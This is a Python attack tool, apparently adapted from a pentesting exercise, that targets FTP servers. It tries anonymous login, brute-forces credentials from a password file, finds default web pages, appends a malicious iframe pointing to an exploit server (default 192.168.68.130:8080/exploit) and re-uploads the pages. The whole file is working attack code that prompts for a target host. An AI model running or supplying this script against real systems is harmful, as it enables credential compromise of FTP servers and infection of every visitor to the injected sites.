#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
tested on linux macox 10.8 android 4 and windows, either python 2 and python 3
'''
import ftplib
import time
import sys
import os
from sys import stdout


def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        stdout.write('\n[*] FTP Anonymous Logon Succeeded.' + str(hostname)) 
        ftp.quit()
        return True
    except Exception as e:
        stdout.write('\n\n[*] FTP Anonymous Logon Failed.' + str(hostname))
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        stdout.write('\n[-] Testing: %s' % str(userName) +'/' + str(passWord))
        stdout.flush()
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            stdout.write('\n[+]%s FTP Logon Succeeded' % str(hostname) +' for ' +userName+'/'+passWord )
            stdout.write('\n')
            stdout.flush()
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    stdout.write('\n\n[-] Could not brute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        stdout.write( '[-] Could not list directory contents.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.phpxx' in fn or '.htm' in fn or '.aspxx' in fn:
            stdout.write( '\n[+] Found default page: ' + fileName)
            stdout.flush()
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    stdout.write( '\n[+] Downloaded Page: ' + page)
    stdout.flush()
    f.write(redirect)
    f.close()
    stdout.write('\n[+] Injecting Malicious IFrame on: ' + page)
    stdout.flush()
    try:
        ver = sys.version.split(' ')[0]
        if ver[0] == "3":
            ftp.storbinary('STOR ' + page, open(page + '.tmp','rb'))
            stdout.write( '\n[+] Uploaded Injected Page: ' + page)
            stdout.flush()
        else:
            ftp.storlines('STOR ' + page, open(page + '.tmp'))
            stdout.write( '\n[+] Uploaded Injected Page: ' + page)
            stdout.flush()
    except Exception as e:
        stdout.write(' [-] Err: %s' % e)
        stdout.flush()
    try:
        os.remove(page + '.tmp')
    except Exception as e:
        stdout.write(' [-] Err: %s' % e)
        stdout.flush()

        
def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    ver = sys.version.split(' ')[0]
    if ver[0] == "3":
        ansh = input('[.] Target Host?: ')
        ansr = input('[.] redirect []default, else IP,Port,Path ? : ')
        ansf = input('[.] Password File: [ ]default : ')
 #       ansv = input('[.] Verbose - default Yes: ').upper()
    else:
        ansh = raw_input('[.] Target Host?: ')
        ansr = raw_input('[.] redirect []default, else IP,Port,Path ? : ')
        ansf = raw_input('[.] Password File: [ ]default : ')
  #      ansv = raw_input('[.] Verbose - default Yes: ').upper()
    
    tgtHost='192.168.1.3' if ansh == "" else str(ansh)
    stdout.write('\n[?] verifying connection...\n')
    try:
        ftp = ftplib.FTP(tgtHost)
    except Exception as e:
        stdout.write('\n\n[-] port 21 closed on Host %s ' % tgtHost + ' Exiting...\n')
        stdout.flush()
        exit(0)
    if ansr != '':
        ansr1 = ansr.split(',')    
        ansr2 = '<iframe src="http://' + ansr1[0]+':'+ansr1[1]+'/'+ansr1[2]+'"></iframe>'
    redirect = '<iframe src="http://192.168.68.130:8080/exploit"></iframe>' if ansr == "" else ansr2
    verbose_Flg = 'Y' # if ansv == "" else "N"    
    try:
        if ansf == "":
            try:
                __dir__ = os.path.dirname(os.path.abspath(__file__))
                filepath = os.path.join(__dir__, 'userpass.txt')
                passwdFile = filepath                
            except Exception as e:
                 stdout.write('\n[-] Err: %s' % e)
                 stdout.flush()
                 exit(__main__)
        else:
            try:
                f=ansf
                __dir__ = os.path.dirname(os.path.abspath(__file__))
                filepath = os.path.join(__dir__, ansf)
                passwdFile = filepath                
            except Exception as e:
                 stdout.write('\n[-] Err: %s' % e)
                 stdout.flush()
                 exit(__main__)
    except Exception as e:
        if verbose_Flg == "Y":
            stdout.write('\n[-] Err: %s' % e)
    Thread_Flg = "Y"
    username = None
    password = None
    if anonLogin(tgtHost) == True:
        username = 'anonymous'
        password = 'me@your.com'
        stdout.write( '\n[+] Using Anonymous Creds to attack\n')
        attack(username, password, tgtHost, redirect)
    elif passwdFile != None:
        (username, password) =  bruteLogin(tgtHost, passwdFile)
        if password != None:
            stdout.write('[+] Using Creds: ' +username + '/' + password + ' to attack')
            stdout.write('\n')
            attack(username, password, tgtHost, redirect)
    stdout.write('\n\n[-] Done')
    stdout.flush() 

if __name__ == '__main__':
    main()